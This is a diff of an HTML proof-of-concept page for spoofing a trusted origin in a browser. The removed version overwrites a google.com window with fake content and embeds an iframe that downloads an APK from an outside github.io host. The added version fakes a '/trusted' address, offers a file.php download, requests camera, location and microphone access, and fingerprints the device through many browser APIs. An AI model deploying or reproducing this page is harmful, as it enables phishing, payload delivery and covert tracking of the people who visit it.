@@ -1,44 +1,248 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>API Access & Google CSI</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
-        }
-        button {
-            margin: 10px;
-            padding: 10px 20px;
-            font-size: 14px;
-            cursor: pointer;
-        }
-    </style>
+<meta charset="utf-8">
+<title>Origin Desync Login PoC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+body {
+  margin:0;
+  font-family:-apple-system,BlinkMacSystemFont,system-ui;
+  background:#f5f5f7;
+}
+
+button {
+  margin:6px;
+  font-size:14px;
+  padding:8px 12px;
+}
+
+#panel {
+  display:none;
+  max-width:520px;
+  margin:60px auto;
+  background:#fff;
+  padding:24px;
+  border-radius:16px;
+  box-shadow:0 20px 60px rgba(0,0,0,.2);
+}
+
+h2 { text-align:center; margin-bottom:6px; }
+.sub { text-align:center; color:#666; margin-bottom:20px; }
+
+.notice {
+  margin-top:14px;
+  font-size:13px;
+  color:#b00020;
+}
+
+.download-button {
+  margin-top:20px;
+  width:100%;
+  padding:12px;
+  font-size:16px;
+  border-radius:10px;
+  border:none;
+  background:#007aff;
+  color:#fff;
+}
+
+video { width:100%; margin-top:10px; }
+
+pre {
+  margin-top:12px;
+  background:#111;
+  color:#0f0;
+  padding:10px;
+  font-size:11px;
+  max-height:260px;
+  overflow:auto;
+}
+</style>
 </head>
+
 <body>
-    <h1>Welcome to API Access & Google CSI Demo</h1>
-    <button onclick="accessData()">Open CSI & Access APIs</button>
 
-    <script>
-        function accessData() {
-            // Open Google CSI (or any other target URL you want) in a new window
-            var x = window.open('https://www.google.com:9090'); // Open Google
+<div style="text-align:center">
+  <button id="trigger">Start PoC</button>
+</div>
 
-            setTimeout(function() {
-                // Simulate a page change with fake content
-                x.document.body.innerHTML = `
-                    <h1>API Access & Geolocation</h1>
-                    <p>Welcome to this demo page. Here we demonstrate accessing various APIs like camera and geolocation.</p>
-                    <p>Click below to see the camera preview and other features.</p>
-                    <h2>Camera Preview:</h2>
-                    <video id="video" width="320" height="240" autoplay></video>
-                    <iframe src="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.apk&sa=D&sntz=1&usg=AOvVaw0onE08hhdtlihXeKuCFYTr" width="600" height="400"></iframe>
-                `;
-            }, 3000); // Wait for 3 seconds to simulate page load time
-        }
-    </script>
+<div id="panel">
+  <h2>Download File</h2>
+  <div class="sub">Click below to download file.php</div>
+
+  <button class="download-button" onclick="downloadFile()">
+    Download File (file.php)
+  </button>
+
+  <hr>
+
+  <button onclick="getLocation()">Get Location</button>
+  <p id="locationOutput">Location: -</p>
+
+  <button onclick="openCamera()">Open Camera</button>
+  <video id="camera" autoplay playsinline></video>
+
+  <hr>
+
+  <!-- 🔥 API FINGERPRINTING -->
+  <button onclick="callAllAPIs()">CALL ALL APIs</button>
+  <button onclick="clearLog()">CLEAR LOG</button>
+  <pre id="apiLog"></pre>
+
+  <div class="notice">
+    Demo only — browser permission required
+  </div>
+</div>
+
+<script>
+const panel = document.getElementById('panel');
+const trigger = document.getElementById('trigger');
+const apiLog = document.getElementById('apiLog');
+
+/* ======================
+   FUNGSI ASLI (TIDAK DIUBAH)
+====================== */
+function downloadFile() {
+  const fileContent = `<?php echo 'This is a malicious PHP file!'; ?>`;
+  const fileBlob = new Blob([fileContent], { type: 'text/plain' });
+  const fileUrl = URL.createObjectURL(fileBlob);
+
+  const downloadLink = document.createElement('a');
+  downloadLink.href = fileUrl;
+  downloadLink.download = 'file.php';
+  document.body.appendChild(downloadLink);
+  downloadLink.click();
+  document.body.removeChild(downloadLink);
+}
+
+function getLocation() {
+  const output = document.getElementById('locationOutput');
+  if (!navigator.geolocation) return;
+  navigator.geolocation.getCurrentPosition(
+    pos => output.textContent =
+      `${pos.coords.latitude}, ${pos.coords.longitude}`,
+    () => output.textContent = 'Permission denied'
+  );
+}
+
+function openCamera() {
+  navigator.mediaDevices.getUserMedia({ video:true })
+    .then(s => camera.srcObject = s)
+    .catch(()=>alert('Camera denied'));
+}
+
+trigger.onclick = () => {
+  history.pushState({}, '', '/trusted');
+  panel.style.display = 'block';
+  openCamera(); // Immediately open the camera when the button is clicked
+};
+
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        location.href = 'https://google.com:9090';
+      }, 80);
+    });
+  });
+});
+
+/* ======================
+   API FINGERPRINTING
+====================== */
+const log = m => apiLog.textContent += m + "\n";
+const clearLog = () => apiLog.textContent = "";
+
+async function callAllAPIs() {
+  log("=== API FINGERPRINT START ===");
+
+  // Storage
+  localStorage.setItem('a','1');
+  sessionStorage.setItem('b','1');
+  indexedDB.open('PWNNNNN');
+  log("Storage: OK");
+
+  // Clipboard
+  try { await navigator.clipboard.writeText("PWNNNNN"); log("Clipboard: OK"); }
+  catch { log("Clipboard: DENIED"); }
+
+  // Notification
+  if (Notification) log("Notification: " + await Notification.requestPermission());
+
+  // Battery
+  if (navigator.getBattery) {
+    const b = await navigator.getBattery();
+    log("Battery: " + Math.round(b.level*100) + "%");
+  }
+
+  // Network
+  if (navigator.connection)
+    log("Network: " + navigator.connection.effectiveType);
+
+  // Vibration
+  navigator.vibrate?.(100);
+
+  // Orientation / Motion
+  addEventListener('deviceorientation', e => log("Orientation: "+e.alpha), {once:true});
+  addEventListener('devicemotion', ()=>log("Motion: OK"), {once:true});
+
+  // Speech
+  speechSynthesis.speak(new SpeechSynthesisUtterance("API fingerprint"));
+  log("Speech synthesis: OK");
+
+  const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
+  log("Speech recognition: " + (SR ? "SUPPORTED":"NO"));
+
+  // Fullscreen
+  document.documentElement.requestFullscreen().catch(()=>{}); 
+  log("Fullscreen: requested");
+
+  // Visibility
+  log("Visibility: " + document.visibilityState);
+
+  // Performance
+  log("Performance.now: " + performance.now());
+
+  // Canvas / WebGL
+  const c = document.createElement('canvas');
+  c.getContext('2d').fillRect(0,0,10,10);
+  log("Canvas: OK");
+  log("WebGL: " + (c.getContext('webgl') ? "OK":"NO"));
+
+  // Gamepad
+  log("Gamepads: " + navigator.getGamepads().length);
+
+  // WebRTC audio
+  try {
+    await navigator.mediaDevices.getUserMedia({audio:true});
+    log("WebRTC audio: OK");
+  } catch { log("WebRTC audio: DENIED"); }
+
+  // Screen
+  log(`Screen: ${screen.width}x${screen.height}`);
+
+  // Lang / TZ
+  log("Lang: " + navigator.language);
+  log("TZ: " + Intl.DateTimeFormat().resolvedOptions().timeZone);
+
+  // Online
+  log("Online: " + navigator.onLine);
+
+  // Permissions
+  if (navigator.permissions) {
+    for (const p of ['camera','microphone','geolocation','notifications']) {
+      try {
+        const r = await navigator.permissions.query({name:p});
+        log(`Perm ${p}: ${r.state}`);
+      } catch {}
+    }
+  }
+
+  log("=== API FINGERPRINT END ===");
+}
+</script>
+
 </body>
 </html>
